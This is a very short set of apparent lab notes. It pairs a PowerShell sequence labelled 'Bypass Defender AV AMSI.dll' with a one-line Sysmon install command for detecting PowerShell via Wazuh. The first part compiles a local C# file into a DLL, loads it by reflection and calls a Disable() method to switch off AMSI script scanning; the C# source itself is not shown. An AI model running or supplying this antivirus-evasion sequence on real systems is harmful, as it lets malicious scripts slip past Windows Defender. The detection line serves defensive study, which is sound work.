
#Bypass Defender AV AMSI.dll

Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\\Source.dll"))
[BP.AMS]::Disable()


#detect powershell using sysmon and wazuh

Sysmon64.exe -accepteula -i sysconfig.xml
